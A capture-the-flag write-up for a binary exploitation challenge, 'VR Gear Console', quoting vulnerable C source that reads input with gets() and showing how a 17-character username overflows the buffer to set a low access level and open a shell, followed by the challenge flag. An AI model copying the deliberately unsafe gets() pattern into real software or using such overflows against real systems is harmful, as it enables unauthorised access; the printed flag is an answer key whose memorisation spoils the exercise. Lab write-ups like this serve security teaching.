# VR Gear Console
## level 2 - binary exploitation - 95 points

### Description
> Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/b7d87de6335e37e49c9ea05875fd2db7

### Hints
> * What happens if you read in more characters than the length of the username buffer?
> * You should look at an ascii table to see what character you need to choose.
> * Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
> * "cat file - | vrgearconsole " will keep the pipe open for commands.

### Solution

Connect via `ssh` and `cd` into `/problems/b7d87de6335e37e49c9ea05875fd2db7`, there are three files:

```
$ ls -l
total 16
-r--r----- 1 hacksports vr-gear-console_3   33 Apr 16  2017 flag.txt
-rwxr-sr-x 1 hacksports vr-gear-console_3 7024 Apr 16  2017 vrgearconsole
-rw-rw-r-- 1 hacksports hacksports        2104 Mar 14  2017 vrgearconsole.c
```

The `flag.txt` file, which we cannot read, the software we have to break and its source. Let's have a look at his source:

```c
#include <stdlib.h>
#include <stdio.h>

int login() {
    int accessLevel = 0xff;
    char username[16];
    char password[32];
    printf("Username (max 15 characters): ");
    gets(username);
    printf("Password (max 31 characters): ");
    gets(password);

    if (!strcmp(username, "admin") && !strcmp(password, "{{ create_long_password() }}")) {
        accessLevel = 2;
    } else if (!strcmp(username, "root") && !strcmp(password, "{{ create_long_password() }}")) {
        accessLevel = 0;
    } else if (!strcmp(username, "artist") && !strcmp(password, "my-password-is-secret")) {
        accessLevel = 0x80;
    }

    return accessLevel;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf(
        "+----------------------------------------+\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|  Welcome to the VR gear admin console  |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "+----------------------------------------+\n"
        "|                                        |\n"
        "|      Your account is not recognized    |\n"
        "|                                        |\n"
        "+----------------------------------------+\n"
        "\n\n\n\n"
        "Please login to continue...\n\n\n"
    );
    int access = login();

    printf("Your access level is: 0x%08x\n", access);

    if (access >= 0xff || access <= 0) {
        printf("Login unsuccessful.\n");
        exit(10);
    } else if (access < 0x30) {
        printf("Admin access granted!\n");
        printf("The flag is in \"flag.txt\".\n");
        system("/bin/sh");
    } else {
        printf("Login successful.\n");
        printf("You do not have permission to access this resource.\n");
        exit(1);
    }
}
```

In line 9 and 11 it uses `gets` to read user input. Just a friendly remainder, I wish to quote this paragraph on `gets` man page:

```
Never  use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.

For more information, see CWE-242 (aka "Use of Inherently Dangerous Function") at http://cwe.mitre.org/data/definitions/242.html
```

They are obviously right, we can perform a buffer overflow attack to modify `accessLevel` variable, that will be returned from `login` function checked later in line 52 to get shell. The only thing we have to do is submitting an username with 16 random character and another one with an ASCII number less than `0x30`:

```
$ ./vrgearconsole
+----------------------------------------+
|                                        |
|                                        |
|                                        |
|                                        |
|  Welcome to the VR gear admin console  |
|                                        |
|                                        |
|                                        |
|                                        |
+----------------------------------------+
|                                        |
|      Your account is not recognized    |
|                                        |
+----------------------------------------+




Please login to continue...


Username (max 15 characters): aaaaaaaaaaaaaaaa!
Password (max 31 characters):
Your access level is: 0x00000021
Admin access granted!
The flag is in "flag.txt".
$ cat flag.txt
8989d0261ee17bbf95ea5596711538b0
```

### Flag
```
8989d0261ee17bbf95ea5596711538b0
```
